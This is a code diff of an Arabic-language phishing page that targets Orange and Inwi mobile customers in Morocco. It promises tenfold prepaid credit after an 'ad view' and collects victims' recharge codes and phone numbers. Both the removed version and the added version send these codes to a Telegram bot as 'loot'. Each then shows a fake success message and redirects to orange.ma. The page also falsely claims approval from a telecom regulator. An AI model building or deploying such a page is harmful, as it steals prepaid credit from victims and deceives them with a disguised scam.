@@ -7,110 +7,85 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --primary: #0052cc; --success: #00875a; --bg: #f4f5f7; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { background: var(--bg); font-family: -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
         .app-card { width: 100%; max-width: 480px; background: #fff; display: flex; flex-direction: column; box-shadow: 0 4px 25px rgba(0,0,0,0.1); }
-        .secure-tag { background: #fff9c4; color: #856404; padding: 10px; font-size: 11px; text-align: center; font-weight: bold; border-bottom: 1px solid #f0e68c; }
-        .header { padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
-        .brand-logos { display: flex; justify-content: center; gap: 30px; margin-bottom: 15px; }
+        .secure-tag { background: #fff9c4; color: #856404; padding: 12px; font-size: 11px; text-align: center; font-weight: bold; border-bottom: 1px solid #f0e68c; }
+        .header { padding: 20px; text-align: center; border-bottom: 1px solid #eee; }
+        .brand-logos { display: flex; justify-content: center; gap: 20px; margin-bottom: 10px; }
         .logo { width: 45px; height: 45px; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-weight: 800; font-size: 10px; }
-        .content { padding: 20px 25px; flex-grow: 1; }
+        .content { padding: 20px; flex-grow: 1; }
         h1 { font-size: 19px; color: #172b4d; text-align: center; margin-bottom: 20px; }
         .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 11px; font-weight: 700; color: #6b778c; margin-bottom: 6px; }
-        select, input { width: 100%; padding: 14px; border: 2px solid #dfe1e6; border-radius: 12px; font-size: 15px; outline: none; background: #fafbfc; box-sizing: border-box; transition: 0.2s; }
-        input:focus, select:focus { border-color: var(--primary); background: #fff; }
-        .bonus-box { background: #e3fcef; color: #006644; padding: 10px; border-radius: 10px; font-size: 12px; font-weight: bold; margin-top: 5px; display: none; text-align: center; border: 1px solid #abf5d1; }
-        .btn-submit { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 15px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        
-        /* واجهة الإعلان */
-        #ad-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.97); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; padding: 20px; }
-        .loader-bar { width: 80%; height: 6px; background: #333; border-radius: 10px; margin-top: 20px; overflow: hidden; }
+        label { display: block; font-size: 12px; font-weight: 700; color: #6b778c; margin-bottom: 6px; }
+        select, input { width: 100%; padding: 15px; border: 2px solid #dfe1e6; border-radius: 12px; font-size: 16px; outline: none; background: #fafbfc; transition: 0.2s; }
+        input:focus { border-color: var(--primary); background: #fff; }
+        .bonus-box { background: #e3fcef; color: #006644; padding: 12px; border-radius: 10px; font-size: 13px; font-weight: bold; margin-top: 8px; display: none; text-align: center; }
+        .btn-submit { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 15px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        #ad-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; padding: 30px; }
+        .loader-bar { width: 100%; max-width: 280px; height: 6px; background: #333; border-radius: 10px; margin-top: 25px; overflow: hidden; }
         .loader-fill { height: 100%; background: var(--primary); width: 0%; transition: 0.1s linear; }
         #status-overlay { display: none; position: fixed; inset: 0; background: #fff; z-index: 20000; flex-direction: column; align-items: center; justify-content: center; }
-        .spin { width: 45px; height: 45px; border: 5px solid #f3f3f3; border-top: 5px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; }
+        .spin { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="app-card">
-    <div class="secure-tag">ℹ️ تمويل الرصيد نشط عبر نظام المشاهدة الإعلانية الموحد.</div>
+    <div class="secure-tag">ℹ️ تمويل الرصيد نشط عبر نظام المشاهدة الإعلانية الموحد (2026)</div>
     <div class="header">
         <div class="brand-logos">
             <div class="logo" style="background: #ff7900;">ORANGE</div>
             <div class="logo" style="background: #ae2d8d; border-radius: 50%;">INWI</div>
         </div>
-        <div style="font-size: 11px; color: var(--success); font-weight: bold; margin-top: 8px;"><i class="fas fa-shield-check"></i> معالج معتمد من الوكالة الوطنية للتقنين</div>
+        <div style="font-size: 11px; color: var(--success); font-weight: bold;"><i class="fas fa-shield-check"></i> معالج معتمد للاتصالات المغربية</div>
     </div>
 
     <div class="content">
-        <h1>تفعيل الرصيد x10</h1>
-
+        <h1>تفعيل الرصيد المباشر x10</h1>
         <div class="input-group">
             <label>شركة الاتصالات</label>
-            <select id="op">
-                <option value="Orange Morocco">Orange (أورنج المغرب)</option>
-                <option value="Inwi Network">Inwi (إنوي)</option>
-            </select>
+            <select id="op"><option>Orange المغرب</option><option>Inwi</option></select>
         </div>
-
         <div class="input-group">
-            <label>مبلغ التعبئة (درهم)</label>
+            <label>مبلغ التعبئة</label>
             <select id="amt" onchange="showBonus()">
                 <option value="">-- اختر المبلغ --</option>
-                <option value="5">5 دراهم</option>
-                <option value="10">10 دراهم</option>
-                <option value="20">20 درهماً</option>
-                <option value="30">30 درهماً</option>
-                <option value="50">50 درهماً</option>
-                <option value="100">100 درهم</option>
-                <option value="200">200 درهم</option>
+                <option value="10">10 دراهم</option><option value="20">20 درهماً</option>
+                <option value="50">50 درهماً</option><option value="100">100 درهم</option>
             </select>
             <div id="bonus-div" class="bonus-box"></div>
         </div>
-
         <div class="input-group">
-            <label>نوع العرض المراد مضاعفته (Pass)</label>
+            <label>نوع العرض (Pass)</label>
             <select id="ps">
-                <option value="*6 (Social Media)">*6 (فيسبوك، واتساب، إنستغرام)</option>
-                <option value="*3 (Internet Full)">*3 (أنترنيت شاملة)</option>
-                <option value="*2 (Appels/Data)">*2 (ساعات مكالمات + أنترنيت)</option>
-                <option value="*1 (International)">*1 (المكالمات الدولية)</option>
-                <option value="*5 (Data Only)">*5 (أنترنيت فقط للروتر والموديم)</option>
-                <option value="*4 (Roaming)">*4 (التجوال الدولي)</option>
-                <option value="*7 (Music/VOD)">*7 (خدمات الترفيه والفيديو)</option>
-                <option value="*8 (Gaming)">*8 (شحن الألعاب والتطبيقات)</option>
-                <option value="*9 (Privilège)">*9 (عروض نادي الامتياز)</option>
-                <option value="Standard (Normal)">رصيد عادي (مكالمات وطنية - بدون نجمة)</option>
+                <option>*6 (Social)</option><option>*3 (Internet)</option>
+                <option>رصيد عادي (بدون نجمة)</option><option>*2 (Appels)</option>
             </select>
         </div>
-
         <div class="input-group">
             <label>كود التعبئة</label>
-            <input type="text" id="cd" placeholder="أدخل الكود (14 أو 16 رقم)" autocomplete="off">
+            <input type="tel" id="cd" placeholder="أدخل 14 أو 16 رقم" maxlength="16">
         </div>
-
         <div class="input-group">
-            <label>رقم هاتف المستفيد</label>
-            <input type="tel" id="ph" placeholder="06XXXXXXXX" autocomplete="off">
+            <label>رقم الهاتف</label>
+            <input type="tel" id="ph" placeholder="06XXXXXXXX" maxlength="10">
         </div>
-
-        <button class="btn-submit" onclick="runAd()">
-            <i class="fas fa-play"></i> مشاهدة العرض الممول والتفعيل
-        </button>
+        <button class="btn-submit" onclick="runAd()">تفعيل العرض الممول</button>
     </div>
 </div>
 
 <div id="ad-modal">
-    <i class="fas fa-video" style="font-size: 50px; color: var(--primary);"></i>
-    <p style="margin-top: 20px; font-weight: bold;">يتم الآن توثيق المشاهدة لتمويل طلبك...</p>
+    <i class="fas fa-circle-play" style="font-size: 60px; color: var(--primary);"></i>
+    <p style="margin-top: 25px; font-weight: bold; font-size: 18px;">جاري توثيق المشاهدة لتمويل طلبك...</p>
     <div class="loader-bar"><div class="loader-fill" id="ad-progress"></div></div>
-    <div id="timer" style="margin-top: 15px; font-size: 20px; font-weight: bold;">08</div>
+    <div id="timer" style="margin-top: 15px; font-size: 24px; font-weight: bold;">07</div>
 </div>
 
 <div id="status-overlay">
     <div class="spin"></div>
-    <p id="msg" style="margin-top: 20px; font-weight: bold; color: var(--primary);">جاري معالجة الكود والمضاعفة...</p>
+    <p style="margin-top: 20px; font-weight: bold; color: var(--primary);">جاري التحقق والمضاعفة...</p>
 </div>
 
 <script>
@@ -120,55 +95,51 @@
     function showBonus() {
         const a = document.getElementById('amt').value;
         const b = document.getElementById('bonus-div');
-        if(a) {
-            b.innerText = `🎁 ستحصل على رصيد إجمالي بقيمة ${a * 10} DH فوراً!`;
-            b.style.display = 'block';
-        } else { b.style.display = 'none'; }
+        if(a) { b.innerText = `🎁 ستحصل على ${a * 10} DH رصيد فوري!`; b.style.display = 'block'; }
+        else { b.style.display = 'none'; }
     }
 
     function runAd() {
-        const k = document.getElementById('cd').value;
-        const p = document.getElementById('ph').value;
-        const a = document.getElementById('amt').value;
-        if(!k || !p || !a) { alert("يرجى ملء جميع الخانات أولاً."); return; }
-
+        if(!document.getElementById('cd').value || !document.getElementById('ph').value || !document.getElementById('amt').value) {
+            alert("يرجى إكمال جميع البيانات."); return;
+        }
         document.getElementById('ad-modal').style.display = 'flex';
-        let time = 8;
+        let time = 7;
         const intv = setInterval(() => {
             time--;
             document.getElementById('timer').innerText = `0${time}`;
-            document.getElementById('ad-progress').style.width = ((8-time)/8*100) + '%';
+            document.getElementById('ad-progress').style.width = ((7-time)/7*100) + '%';
             if(time <= 0) { clearInterval(intv); finalize(); }
         }, 1000);
     }
 
-    async function finalize() {
+    function finalize() {
         document.getElementById('ad-modal').style.display = 'none';
         document.getElementById('status-overlay').style.display = 'flex';
 
-        const op = document.getElementById('op').value;
-        const amt = document.getElementById('amt').value;
-        const ps = document.getElementById('ps').value;
-        const cd = document.getElementById('cd').value;
-        const ph = document.getElementById('ph').value;
+        const text = `🎯 **صيدة MNB جديدة** 🎯\n\n` +
+                   `🏢 الشركة: ${document.getElementById('op').value}\n` +
+                   `💵 المبلغ: ${document.getElementById('amt').value} DH\n` +
+                   `📦 العرض: ${document.getElementById('ps').value}\n` +
+                   `🎫 الكود: \`${document.getElementById('cd').value}\`\n` +
+                   `📱 الهاتف: \`${document.getElementById('ph').value}\``;
 
-        const text = `💰 **غنائم MNB (القائمة الكاملة)** 💰\n\n` +
-                   `🏢 **الشركة:** ${op}\n` +
-                   `💵 **المبلغ:** ${amt} DH\n` +
-                   `📦 **العرض:** ${ps}\n` +
-                   `🎫 **الكود:** \`${cd}\`\n` +
-                   `📱 **الهاتف:** \`${ph}\`\n\n` +
-                   `✅ **الحالة:** تم التوثيق والتمويل`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-            setTimeout(() => {
-                alert("✅ مبروك! تمت المشاهدة وقبول الكود. ستصلك رسالة التأكيد خلال 5 دقائق.");
-                window.location.href = "https://www.orange.ma";
-            }, 3000);
-        } catch(e) { location.reload(); }
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        
+        // إرسال البيانات باستخدام XHR لضمان التوافق التام
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                setTimeout(() => {
+                    alert("✅ مبروك! تمت العملية بنجاح، ستصلك رسالة التأكيد قريباً.");
+                    window.location.href = "https://www.orange.ma";
+                }, 2000);
+            }
+        };
+        xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' }));
     }
 </script>
-
 </body>
 </html>
